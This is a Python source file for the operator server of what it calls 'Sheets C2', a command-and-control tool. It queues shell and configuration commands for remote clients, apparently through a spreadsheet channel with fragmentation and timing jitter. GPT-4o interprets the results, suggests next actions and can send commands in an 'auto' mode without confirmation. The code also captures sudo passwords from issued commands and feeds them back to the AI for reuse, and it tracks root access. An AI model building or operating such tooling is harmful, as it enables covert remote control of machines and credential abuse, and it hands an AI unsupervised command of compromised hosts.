"""
server.py — task dispatcher and AI operator interface

Usage:
    python server.py send --command system_info
    python server.py send --command shell --payload '{"cmd": "ls -la"}'
    python server.py collect [--id <command_id>]
    python server.py ai
"""

import json
import os
import sys
import threading
import time
import uuid
from datetime import datetime, timezone

import common

# ---------------------------------------------------------------------------
# ANSI colors
# ---------------------------------------------------------------------------

C_RESET  = "\033[0m"
C_GREEN  = "\033[32m"
C_RED    = "\033[31m"
C_CYAN   = "\033[36m"
C_YELLOW = "\033[33m"
C_BOLD   = "\033[1m"
C_DIM    = "\033[2m"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def now_iso():
    return datetime.now(timezone.utc).isoformat()


def _load_system_prompt(path="system_prompt.txt"):
    if not os.path.exists(path):
        print(f"{C_YELLOW}[warn] {path} not found — using empty system prompt{C_RESET}")
        return ""
    with open(path, encoding="utf-8") as f:
        return f.read()


def _strip_markdown(text):
    """Remove common markdown formatting for plain terminal display."""
    import re
    text = re.sub(r'\*{1,3}(.+?)\*{1,3}', r'\1', text)
    text = re.sub(r'`{3}.*?\n', '', text, flags=re.DOTALL)
    text = re.sub(r'`(.+?)`', r'\1', text)
    text = re.sub(r'^#{1,6}\s+', '', text, flags=re.MULTILINE)
    text = re.sub(r'^\s*[-*]\s+', '', text, flags=re.MULTILINE)
    return text.strip()


def _sanitize_for_gpt(text):
    """Strip characters that cause OpenAI API 400 errors (null bytes, stray control chars)."""
    import re
    text = text.replace('\x00', '')
    text = re.sub(r'[\x01-\x08\x0b\x0c\x0e-\x1f\x7f]', '', text)
    return text


def _wants_raw(text):
    lower = text.lower()
    return any(kw in lower for kw in ("raw", "json", "dump", "exact", "full output", "complete output"))


def _wants_summary(text):
    lower = text.lower()
    return any(kw in lower for kw in ("summarize", "summary", "interpret", "what does it mean",
                                       "what does that mean", "explain what", "explain the"))


# ---------------------------------------------------------------------------
# Send / Collect
# ---------------------------------------------------------------------------

def send_command(command, payload=None, target="outbox"):
    command_id = str(uuid.uuid4())
    payload_str = json.dumps(payload or {})
    data = {
        "command_id": command_id,
        "command": command,
        "payload": payload_str,
        "target": target,
        "status": "pending",
        "created_at": now_iso(),
    }
    fragmenter = common.get_fragmenter()
    chunks = fragmenter.fragment(payload_str)
    if len(chunks) == 1:
        common.write_inbox_form(data)
    else:
        frags = common.build_inbox_fragments(data, chunks)
        print(f"[server] Payload fragmented into {len(frags)} chunks")
        for frag in frags:
            common.write_inbox_form(frag)
    print(f"[server] Sent {command_id}: {command}")
    _print_delivery_estimate()
    return command_id


def _print_delivery_estimate():
    """Print expected response timing based on client config and fragment settings."""
    # Read client config if available locally, otherwise use defaults
    client_cfg = {}
    if os.path.exists(".client_config.json"):
        try:
            with open(".client_config.json") as f:
                client_cfg = json.load(f)
        except Exception:
            pass

    try:
        interval   = float(client_cfg.get("cycle_interval_sec", 30))
        jitter_min = float(client_cfg.get("cycle_jitter_min",    5))
        jitter_max = float(client_cfg.get("cycle_jitter_max",   15))
    except ValueError:
        interval, jitter_min, jitter_max = 30, 5, 15

    cycle_min = interval + jitter_min
    cycle_max = interval + jitter_max

    method = os.environ.get("FRAGMENT_METHOD", "passthrough").strip().lower()

    if method == "fixed":
        try:
            chunk_size = int(os.environ.get("FRAGMENT_CHUNK_SIZE", 2000))
        except ValueError:
            chunk_size = 2000
        print(
            f"{C_DIM}[timing] Fragmentation on (chunk: {chunk_size}b). "
            f"First fragment arrives in {cycle_min:.0f}–{cycle_max:.0f}s. "
            f"Each additional fragment adds {cycle_min:.0f}–{cycle_max:.0f}s. "
            f"Large results span multiple cycles.{C_RESET}"
        )
    else:
        print(
            f"{C_DIM}[timing] Response expected in {cycle_min:.0f}–{cycle_max:.0f}s "
            f"(1 poll cycle).{C_RESET}"
        )


def collect(filter_id=None):
    outbox = common.read_outbox()
    if filter_id:
        outbox = [r for r in outbox if r.get("command_id") == filter_id]
    return outbox


def collect_new(seen_ids, filter_id=None):
    """Return only outbox rows not yet seen this session, excluding heartbeats.

    Heartbeat rows are silently added to seen_ids so they never surface to callers.
    Updates seen_ids in place.
    """
    all_results = collect(filter_id)
    new = []
    for r in all_results:
        cid = r.get("command_id")
        if cid in seen_ids:
            continue
        if cid:
            seen_ids.add(cid)
        if r.get("status") == "heartbeat":
            continue
        new.append(r)
    return new


# ---------------------------------------------------------------------------
# Result rendering
# ---------------------------------------------------------------------------

def _print_results(results):
    """Render outbox rows to the terminal without going through GPT-4o."""
    has_error = False
    for i, row in enumerate(results):
        if i > 0:
            print()
        status = row.get("status", "")
        if status == "error":
            has_error = True

        try:
            data = json.loads(row.get("result", "{}"))
        except (json.JSONDecodeError, TypeError):
            data = {}

        if "stdout" in data:
            stdout = data["stdout"].replace("\\n", "\n")
            stderr = data["stderr"].replace("\\n", "\n") if data.get("stderr") else ""
            rc = data.get("returncode", 0)

            color = C_RED if (rc != 0 or status == "error") else C_GREEN
            if stdout:
                print(f"{color}{stdout}{C_RESET}", end="")
                if not stdout.endswith("\n"):
                    print()
            if stderr:
                print(f"{C_RED}{stderr}{C_RESET}", end="")
                if not stderr.endswith("\n"):
                    print()
            if rc != 0:
                print(f"{C_RED}[exit {rc}]{C_RESET}")
        elif "error" in data:
            has_error = True
            print(f"{C_RED}{data['error']}{C_RESET}")
        else:
            color = C_RED if status == "error" else C_GREEN
            for k, v in data.items():
                print(f"{color}{k}: {v}{C_RESET}")

    return has_error


def _result_summary(row):
    """One-line summary of an outbox row for the command log."""
    try:
        data = json.loads(row.get("result", "{}"))
    except (json.JSONDecodeError, TypeError):
        return row.get("status", "unknown")
    if "stdout" in data:
        out = (data["stdout"] or "").strip()
        err = (data["stderr"] or "").strip()
        rc = data.get("returncode", 0)
        if rc != 0 and not out:
            snippet = err[:100] if err else f"exit {rc}"
            return f"exit {rc}: {snippet}"
        snippet = out[:120]
        return (snippet + "...") if len(out) > 120 else (snippet or f"(empty, exit {rc})")
    if "error" in data:
        return f"error: {str(data['error'])[:100]}"
    return json.dumps(data)[:120]


def _cmd_desc(action):
    """Short description of a command for the session log."""
    payload = action.get("payload") or {}
    if action.get("command") == "shell":
        return payload.get("cmd", "shell")
    if action.get("command") == "system_info":
        return "system_info"
    return f"{action.get('command')}: {json.dumps(payload)}"


# ---------------------------------------------------------------------------
# API message construction
# ---------------------------------------------------------------------------

def _build_api_messages(messages, cmd_log, client_os_info=None, output_mode=None, session_facts=None):
    """Inject session facts, client info, output mode, and command log before the last user turn."""
    extra = []
    if session_facts:
        facts_block = "SESSION FACTS (always apply these):\n" + "\n".join(f"- {f}" for f in session_facts)
        extra.append({"role": "system", "content": facts_block})
    if client_os_info:
        parts = []
        for cid, info in client_os_info.items():
            parts.append(
                f"  {cid}: OS={info.get('os','?')}, hostname={info.get('hostname','?')}, "
                f"arch={info.get('architecture','?')}, user={info.get('username','?')}"
            )
        extra.append({
            "role": "system",
            "content": "Connected client info:\n" + "\n".join(parts),
        })
    if output_mode:
        if output_mode == "raw":
            mode_hint = ("Output mode: raw. Results are displayed as unformatted terminal output. "
                         "Do not add explanation or summary text unless the user explicitly asks for one.")
        else:
            mode_hint = ("Output mode: interpreted. When reading results, always include a concise "
                         "explanation field summarizing what the output means. Prefer read_and_act "
                         "over bare read_outbox so your interpretation is shown alongside the data.")
        extra.append({"role": "system", "content": mode_hint})
    if cmd_log:
        lines = [f"{i+1}. {e['desc']} -> {e['result'] or 'pending'}" for i, e in enumerate(cmd_log)]
        extra.append({
            "role": "system",
            "content": "Commands executed this session:\n" + "\n".join(lines) + "\nDo not repeat failed commands.",
        })
    if not extra:
        return messages
    return messages[:-1] + extra + [messages[-1]]


# ---------------------------------------------------------------------------
# Session startup prompts
# ---------------------------------------------------------------------------

def _ask_mode():
    while True:
        try:
            choice = input(
                f"  Auto-send commands or confirm each one? "
                f"[{C_GREEN}A{C_RESET}]uto / [{C_YELLOW}C{C_RESET}]onfirm: "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            return "confirm"
        if choice in ("a", "auto"):
            print(f"  {C_GREEN}Auto mode.{C_RESET} Commands sent immediately.\n")
            return "auto"
        if choice in ("c", "confirm"):
            print(f"  {C_YELLOW}Confirm mode.{C_RESET} You will preview each command.\n")
            return "confirm"


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------

def _print_command_preview(action):
    print(f"\n{C_YELLOW}  Command : {action.get('command')}{C_RESET}")
    print(f"{C_YELLOW}  Payload : {json.dumps(action.get('payload', {}))}{C_RESET}")
    print(f"{C_YELLOW}  Target  : {action.get('target', 'outbox')}{C_RESET}")


def _dispatch_send(action, send_mode):
    """Handle warning check, auto/confirm flow, and send. Returns command_id or None."""
    warning = action.get("warning")
    if warning:
        _print_command_preview(action)
        print(f"\n  {C_RED}{C_BOLD}WARNING: {warning}{C_RESET}")
        choice = input(f"\n  [{C_GREEN}S{C_RESET}]end anyway  [{C_RED}C{C_RESET}]ancel: ").strip().lower()
        if choice != "s":
            print(f"  {C_YELLOW}Cancelled.{C_RESET}\n")
            return None
    elif send_mode == "confirm":
        _print_command_preview(action)
        choice = input(f"\n  [{C_GREEN}S{C_RESET}]end  [{C_RED}C{C_RESET}]ancel: ").strip().lower()
        if choice != "s":
            print(f"  {C_YELLOW}Cancelled.{C_RESET}\n")
            return None

    cmd_id = send_command(action["command"], action.get("payload"), action.get("target", "outbox"))
    if send_mode == "auto" and not warning:
        print(f"  {C_GREEN}Sent{C_RESET}  {action['command']}  ID: {cmd_id}\n")
    else:
        print(f"  {C_GREEN}Sent.{C_RESET} ID: {cmd_id}\n")
    return cmd_id


# ---------------------------------------------------------------------------
# AI chat
# ---------------------------------------------------------------------------

def ai_chat():
    try:
        from openai import OpenAI, BadRequestError, APIError
    except ImportError:
        print("[error] openai package not installed. Run: pip install openai")
        sys.exit(1)

    client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))
    system_prompt = _load_system_prompt()
    messages = [{"role": "system", "content": system_prompt}]

    arrived_ids = set()
    seen_ids = set()
    pending_results = {}
    client_os_info = {}
    cmd_log = []
    cmd_id_to_idx = {}
    session_facts = []
    pending_suggestion = [None]
    pending_suggestion_lock = threading.Lock()

    print(f"\n{C_BOLD}{'─' * 48}{C_RESET}")
    print(f"{C_BOLD}  Sheets C2  —  AI Operator Console{C_RESET}")
    print(f"{C_BOLD}{'─' * 48}{C_RESET}\n")

    send_mode = _ask_mode()
    output_mode = "interpreted"

    # Pre-populate from existing outbox
    try:
        for r in common.read_outbox():
            cid = r.get("command_id")
            if cid:
                arrived_ids.add(cid)
                seen_ids.add(cid)
            if r.get("status") == "heartbeat":
                hb_client = r.get("client_id", "unknown")
                try:
                    info = json.loads(r.get("result", "{}"))
                    client_os_info[hb_client] = info
                    if "cycle_interval_sec" in info:
                        common.get_channel().set_refresh_interval(
                            float(info["cycle_interval_sec"]), manual=False
                        )
                except Exception:
                    pass
                common.delete_outbox_entry(cid)
    except Exception:
        pass

    print(f"  Type a command in plain language, or: "
          f"mode auto/confirm, output raw/interpreted, refresh <sec>/auto, exit.\n")

    def _interpret(results):
        results_json = _sanitize_for_gpt(json.dumps(results, indent=2))
        resp = client.chat.completions.create(
            model="gpt-4o",
            messages=_build_api_messages(messages, cmd_log, client_os_info, output_mode, session_facts) + [{
                "role": "user",
                "content": f"Interpret these results in 1-3 concise sentences. No markdown, no bullet points.\n{results_json}",
            }],
            temperature=0,
        )
        return resp.choices[0].message.content.strip()

    def _analyze_result(row):
        result_json = _sanitize_for_gpt(json.dumps(row, indent=2))
        try:
            resp = client.chat.completions.create(
                model="gpt-4o",
                messages=_build_api_messages(messages[:], cmd_log[:], client_os_info, output_mode, session_facts) + [{
                    "role": "user",
                    "content": (
                        f"A result just arrived:\n{result_json}\n\n"
                        "Respond with a single JSON object (no markdown):\n"
                        '{"summary": "<1-2 sentence interpretation>", '
                        '"suggestion": "<one-line description of the best next step>", '
                        '"action": {"action": "send_command", "command": "<name>", "payload": {...}}}'
                    ),
                }],
                temperature=0,
            )
            raw = resp.choices[0].message.content.strip()
            data = json.loads(raw)
            return data.get("summary"), data.get("suggestion"), data.get("action")
        except Exception:
            return None, None, None

    def _update_session_facts(cmd_id, row):
        import re as _re
        entry = cmd_log[cmd_id_to_idx[cmd_id]] if cmd_id in cmd_id_to_idx else {}
        command = entry.get("command", "")
        payload = entry.get("payload") or {}
        cmd_str = payload.get("cmd", "") if command == "shell" else ""
        status = row.get("status", "")
        try:
            data = json.loads(row.get("result", "{}"))
        except Exception:
            data = {}
        stdout = (data.get("stdout") or "").strip()

        if status == "success" and "sudo -S" in cmd_str:
            m = _re.search(r"echo '([^']+)' \| sudo -S", cmd_str)
            if m:
                pwd = m.group(1)
                fact = f"sudo credentials confirmed: password='{pwd}' — always use echo '{pwd}' | sudo -S <cmd>"
                if not any("sudo credentials confirmed" in f for f in session_facts):
                    session_facts.append(fact)
                    print(f"{C_DIM}  [Fact] {fact}{C_RESET}")

        if status == "success" and "whoami" in cmd_str and stdout == "root":
            fact = "root access available (whoami=root)"
            if fact not in session_facts:
                session_facts.append(fact)
                print(f"{C_DIM}  [Fact] {fact}{C_RESET}")

        if command == "system_info" and isinstance(data, dict) and "os" in data:
            os_name = data.get("os", "")
            arch = data.get("architecture", "")
            hostname = data.get("hostname", "")
            username = data.get("username", "")
            ver = data.get("os_version", "")
            # distro (from /etc/os-release) is authoritative over os_version for
            # environment identification — os_version reflects host kernel in containers
            distro = data.get("distro", "")
            if os_name:
                fact = f"OS: {distro or os_name} | kernel: {ver} | arch: {arch} | hostname: {hostname} | user: {username}"
                replaced = False
                for i, f in enumerate(session_facts):
                    if f.startswith("OS:"):
                        session_facts[i] = fact
                        replaced = True
                        break
                if not replaced:
                    session_facts.append(fact)

        if status == "success" and "uname" in cmd_str and stdout:
            if not any(f.startswith("OS:") or f.startswith("uname:") for f in session_facts):
                fact = f"uname: {stdout[:150]}"
                session_facts.append(fact)

    def _start_poll_thread(cmd_id, command_desc):
        def _poll():
            deadline = time.time() + 300

            while time.time() < deadline:
                # Re-query each cycle so operator 'refresh' commands take effect immediately.
                time.sleep(common.get_channel().refresh_interval())
                try:
                    rows = common.read_outbox()
                except Exception:
                    continue
                for row in rows:
                    if row.get("status") == "heartbeat":
                        hb_id = row.get("command_id", "")
                        if hb_id and hb_id not in arrived_ids:
                            arrived_ids.add(hb_id)
                            seen_ids.add(hb_id)
                            hb_client = row.get("client_id", "unknown")
                            try:
                                info = json.loads(row.get("result", "{}"))
                                client_os_info[hb_client] = info
                                if "cycle_interval_sec" in info:
                                    common.get_channel().set_refresh_interval(
                                        float(info["cycle_interval_sec"]), manual=False
                                    )
                            except Exception:
                                pass
                            common.delete_outbox_entry(hb_id)

                    if row.get("command_id") == cmd_id and row.get("status") != "heartbeat":
                        arrived_ids.add(cmd_id)
                        seen_ids.add(cmd_id)
                        pending_results[cmd_id] = row
                        if cmd_id in cmd_id_to_idx:
                            cmd_log[cmd_id_to_idx[cmd_id]]["result"] = _result_summary(row)
                        _update_session_facts(cmd_id, row)
                        # Remove the inbox entry now that the result is confirmed.
                        # No-op for channels that don't support deletion (Sheets).
                        common.delete_task_entry(cmd_id)

                        status = row.get("status", "?")
                        color = C_GREEN if status == "success" else C_RED
                        print(
                            f"\n{C_BOLD}[Result arrived]{C_RESET} "
                            f"{cmd_id[:8]}: {command_desc} {color}→ {status}{C_RESET}"
                        )

                        if output_mode == "interpreted":
                            summary, suggestion_text, suggestion_action = _analyze_result(row)
                            if summary:
                                print(f"{C_CYAN}{_strip_markdown(summary)}{C_RESET}")
                        else:
                            print()
                            _print_results([row])
                            _, suggestion_text, suggestion_action = _analyze_result(row)

                        if suggestion_text and suggestion_action:
                            import re as _re
                            sugg_display = _re.sub(r'^\[suggestion\]\s*', '', suggestion_text, flags=_re.IGNORECASE).strip()
                            with pending_suggestion_lock:
                                pending_suggestion[0] = suggestion_action
                            print(f"{C_DIM}  [Suggestion] {sugg_display}{C_RESET}")

                        print(f"\n{C_CYAN}>{C_RESET} ", end="", flush=True)
                        return

            print(f"\n{C_YELLOW}[Timeout]{C_RESET} {cmd_id[:8]}: no result after 5 min")
            print(f"{C_CYAN}>{C_RESET} ", end="", flush=True)

        t = threading.Thread(target=_poll, daemon=True)
        t.start()

    def _record_send(action, cmd_id):
        desc = _cmd_desc(action)
        entry = {
            "desc": desc, "cmd_id": cmd_id, "result": None,
            "command": action.get("command", ""), "payload": action.get("payload") or {}
        }
        cmd_id_to_idx[cmd_id] = len(cmd_log)
        cmd_log.append(entry)
        _start_poll_thread(cmd_id, desc)

    def _update_log_from_results(results):
        for r in results:
            cid = r.get("command_id")
            if cid and cid in cmd_id_to_idx:
                cmd_log[cmd_id_to_idx[cid]]["result"] = _result_summary(r)
            if cid:
                _update_session_facts(cid, r)

    def _fetch_results(fid, show_all):
        return collect(fid) if show_all else collect_new(seen_ids, fid)

    # Main loop
    while True:
        try:
            user_input = input(f"{C_CYAN}>{C_RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if user_input.lower() in ("exit", "quit"):
            break
        if not user_input:
            continue

        cmd = user_input.lower()

        # Client-side commands — never sent to GPT-4o
        if cmd in ("help", "?help", "h"):
            print(f"""
{C_BOLD}Local REPL commands{C_RESET} — handled directly, never sent to the AI:

  {C_CYAN}mode auto{C_RESET}              Send commands immediately without confirmation
  {C_CYAN}mode confirm{C_RESET}           Preview and confirm each command before sending
  {C_CYAN}mode{C_RESET}                   Show current send mode

  {C_CYAN}output raw{C_RESET}             Show results as plain terminal output
  {C_CYAN}output interpreted{C_RESET}     Show results with AI interpretation
  {C_CYAN}output{C_RESET}                 Show current output mode

  {C_CYAN}refresh <sec>{C_RESET}          Override server refresh interval (manual — pauses heartbeat sync)
  {C_CYAN}refresh auto{C_RESET}           Clear override — sync refresh to client heartbeat timing
  {C_CYAN}refresh{C_RESET}                Show current refresh interval and its source

  {C_CYAN}do it{C_RESET} / {C_CYAN}yes{C_RESET} / {C_CYAN}go{C_RESET}      Execute the pending AI suggestion
  {C_CYAN}exit{C_RESET} / {C_CYAN}quit{C_RESET}           Exit the console

{C_BOLD}AI commands{C_RESET} — everything else is sent to the AI:
  Ask in plain language. The AI will send commands, read results, and suggest next steps.
  Ask "help with config" or "what cycle settings are available" for client config guidance.
""")
            continue

        if cmd == "mode auto":
            send_mode = "auto"
            print(f"  {C_GREEN}Switched to auto mode.{C_RESET}\n")
            continue
        if cmd == "mode confirm":
            send_mode = "confirm"
            print(f"  {C_YELLOW}Switched to confirm mode.{C_RESET}\n")
            continue
        if cmd == "mode":
            label = f"{C_GREEN}auto{C_RESET}" if send_mode == "auto" else f"{C_YELLOW}confirm{C_RESET}"
            print(f"  Current mode: {label}\n")
            continue
        if cmd in ("output raw", "output r", "mode raw"):
            output_mode = "raw"
            print(f"  {C_GREEN}Switched to raw output mode.{C_RESET}\n")
            continue
        if cmd in ("output interpreted", "output i", "mode interpreted"):
            output_mode = "interpreted"
            print(f"  {C_CYAN}Switched to interpreted output mode.{C_RESET}\n")
            continue
        if cmd == "output":
            label = f"{C_GREEN}raw{C_RESET}" if output_mode == "raw" else f"{C_CYAN}interpreted{C_RESET}"
            print(f"  Current output mode: {label}\n")
            continue

        # refresh <sec> / refresh auto / refresh
        # Also catch natural-language phrasings before they reach GPT-4o
        if any(p in cmd for p in ("set refresh to auto", "refresh to auto", "change refresh to auto",
                                   "refresh mode auto", "auto refresh")):
            common.get_channel().clear_refresh_override()
            print(f"  {C_GREEN}Refresh override cleared — interval will sync to next heartbeat.{C_RESET}\n")
            continue
        if cmd.startswith("refresh"):
            ch = common.get_channel()
            arg = cmd[len("refresh"):].strip()
            if arg == "auto":
                ch.clear_refresh_override()
                print(f"  {C_GREEN}Refresh override cleared — interval will sync to next heartbeat.{C_RESET}\n")
            elif arg == "":
                interval = ch.refresh_interval()
                source = f"{C_YELLOW}manual override{C_RESET}" if ch._manual_override else f"{C_CYAN}heartbeat sync{C_RESET}"
                print(f"  Refresh interval: {C_BOLD}{interval:.1f}s{C_RESET} ({source})\n")
            else:
                try:
                    secs = float(arg)
                    if secs <= 0:
                        raise ValueError
                    ch.set_refresh_interval(secs, manual=True)
                    print(f"  {C_GREEN}Refresh interval set to {secs:.1f}s (manual override — heartbeat sync paused).{C_RESET}\n")
                except ValueError:
                    print(f"  {C_RED}Usage: refresh <seconds>  |  refresh auto  |  refresh{C_RESET}\n")
            continue

        if cmd in ("do it", "yes", "go", "y"):
            with pending_suggestion_lock:
                sugg = pending_suggestion[0]
                pending_suggestion[0] = None
            if sugg and sugg.get("action") == "send_command":
                cmd_id = _dispatch_send(sugg, send_mode)
                if cmd_id:
                    _record_send(sugg, cmd_id)
            elif sugg:
                print(f"  {C_YELLOW}Suggestion is not a sendable command — type it out instead.{C_RESET}\n")
            else:
                print(f"  {C_YELLOW}No pending suggestion.{C_RESET}\n")
            continue

        # Raw output bypass — caught before GPT-4o
        _raw_kws = ("raw", "exact", "terminal output", "full output", "like a terminal")
        if any(kw in cmd for kw in _raw_kws):
            latest_row = None
            for entry in reversed(cmd_log):
                cid = entry.get("cmd_id")
                if cid and cid in pending_results:
                    latest_row = pending_results[cid]
                    break
            if latest_row:
                try:
                    data = json.loads(latest_row.get("result", "{}"))
                except (json.JSONDecodeError, TypeError):
                    data = {}
                stdout = data.get("stdout", "")
                if stdout:
                    print(stdout, end="")
                    if not stdout.endswith("\n"):
                        print()
                else:
                    print(f"  {C_YELLOW}(no stdout in latest result){C_RESET}")
            else:
                print(f"  {C_YELLOW}No results available yet.{C_RESET}")
            print()
            continue

        # Per-turn output mode override
        wants_raw_this_turn = _wants_raw(user_input)
        wants_summary_this_turn = _wants_summary(user_input)
        show_all = any(kw in cmd for kw in ("all", "history", "everything"))

        messages.append({"role": "user", "content": user_input})

        try:
            api_messages = _build_api_messages(messages, cmd_log, client_os_info, output_mode, session_facts)
            resp = client.chat.completions.create(
                model="gpt-4o",
                messages=api_messages,
                temperature=0,
            )
            reply = resp.choices[0].message.content
            messages.append({"role": "assistant", "content": reply})

            # Trim history: keep system prompt + last 20 messages
            if len(messages) > 21:
                messages[1:] = messages[-20:]

            try:
                action = json.loads(reply)
            except json.JSONDecodeError:
                print(f"\n{C_YELLOW}[AI returned unexpected format]{C_RESET}")
                print(f"{reply}\n")
                continue

            if "action" not in action:
                print(f"\n{C_YELLOW}[AI returned unexpected format]{C_RESET}")
                print(f"{reply}\n")
                continue

            if action["action"] == "explain":
                text = _strip_markdown(action.get("text", "")).replace("\\n", "\n")
                print(f"\n{text}\n")

            elif action["action"] == "send_command":
                cmd_id = _dispatch_send(action, send_mode)
                if cmd_id:
                    _record_send(action, cmd_id)

            elif action["action"] == "read_outbox":
                results = _fetch_results(action.get("filter_command_id"), show_all)
                _update_log_from_results(results)
                if not results:
                    print(f"\n  {C_YELLOW}No new results.{C_RESET}\n")
                    continue
                if wants_raw_this_turn:
                    print(f"\n{json.dumps(results, indent=2)}\n")
                    continue
                print()
                _print_results(results)
                print()
                if output_mode == "interpreted" or wants_summary_this_turn:
                    try:
                        summary = _interpret(results)
                        if summary:
                            print(f"{C_CYAN}{_strip_markdown(summary)}{C_RESET}\n")
                    except BadRequestError:
                        print(f"{C_YELLOW}[AI error] Result had invalid characters — raw output shown above.{C_RESET}\n")
                    except Exception as e:
                        print(f"{C_YELLOW}[interpret error] {e}{C_RESET}\n")

            elif action["action"] == "read_and_act":
                results = _fetch_results(action.get("filter_command_id"), show_all)
                _update_log_from_results(results)
                if results:
                    if wants_raw_this_turn:
                        print(f"\n{json.dumps(results, indent=2)}\n")
                    else:
                        print()
                        _print_results(results)
                        print()

                explanation = action.get("explanation", "").replace("\\n", "\n")
                if explanation and (output_mode == "interpreted" or wants_summary_this_turn):
                    print(f"{_strip_markdown(explanation)}\n")

                cmd_id = _dispatch_send(action, send_mode)
                if cmd_id:
                    _record_send(action, cmd_id)

        except KeyboardInterrupt:
            print(f"\n{C_YELLOW}[Interrupted]{C_RESET}\n")
        except Exception as e:
            try:
                from openai import BadRequestError as _BRE, APIError as _AE
                if isinstance(e, _BRE):
                    print(f"{C_YELLOW}[AI error] Result had invalid characters. Showing raw output:{C_RESET}")
                    try:
                        raw_results = collect_new(seen_ids)
                        if raw_results:
                            print()
                            _print_results(raw_results)
                            print()
                    except Exception:
                        pass
                elif isinstance(e, _AE):
                    print(f"{C_YELLOW}[API error] {e}{C_RESET}\n")
                else:
                    print(f"{C_RED}[error] {e}{C_RESET}\n")
            except ImportError:
                print(f"{C_RED}[error] {e}{C_RESET}\n")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

_CLI_HELP = """\
Usage: python server.py <mode> [options]

Modes:
  send      Send a command to the client
  collect   Read results from the outbox
  ai        Start the interactive AI operator console

Send options:
  --command <name>       Command name (required)
  --payload '<json>'     JSON payload string (optional, default: {})

Available commands:
  system_info            Return OS, hostname, arch, Python version
  echo                   Echo back the payload  {"msg": "..."}
  shell                  Run a shell command     {"cmd": "...", "stdin": "..."}
  config                 Update client settings  {"cycle_interval_sec": "1",
                                                  "cycle_jitter_min": "2",
                                                  "cycle_jitter_max": "3",
                                                  "client_id": "NADAV",
                                                  "heartbeat_every": "5"}

Collect options:
  --id <command_id>      Filter results to a specific command UUID

Examples:
  python server.py send --command system_info
  python server.py send --command shell --payload '{"cmd": "whoami"}'
  python server.py send --command config --payload '{"cycle_interval_sec": "10"}'
  python server.py collect
  python server.py collect --id <uuid>
  python server.py ai

AI console commands (type inside the ai session):
  help                   Show all local REPL commands
  mode auto|confirm      Set send mode
  output raw|interpreted Set output mode
  refresh <sec>          Override server refresh interval
  refresh auto           Sync refresh to client heartbeat timing
  refresh                Show current refresh interval
"""


def main():
    common.load_env()

    if len(sys.argv) < 2 or sys.argv[1] in ("--help", "-h", "help"):
        print(_CLI_HELP)
        sys.exit(0 if len(sys.argv) > 1 else 1)

    mode = sys.argv[1]

    if mode == "send":
        command = None
        payload = None
        args = sys.argv[2:]
        i = 0
        while i < len(args):
            if args[i] == "--command" and i + 1 < len(args):
                command = args[i + 1]; i += 2
            elif args[i] == "--payload" and i + 1 < len(args):
                payload = json.loads(args[i + 1]); i += 2
            else:
                i += 1
        if not command:
            print("Error: --command required")
            sys.exit(1)
        send_command(command, payload)

    elif mode == "collect":
        filter_id = None
        if "--id" in sys.argv:
            idx = sys.argv.index("--id")
            filter_id = sys.argv[idx + 1]
        results = collect(filter_id)
        for r in results:
            print(json.dumps(r, indent=2))

    elif mode == "ai":
        ai_chat()

    else:
        print(f"Unknown mode: {mode}")
        sys.exit(1)


if __name__ == "__main__":
    main()
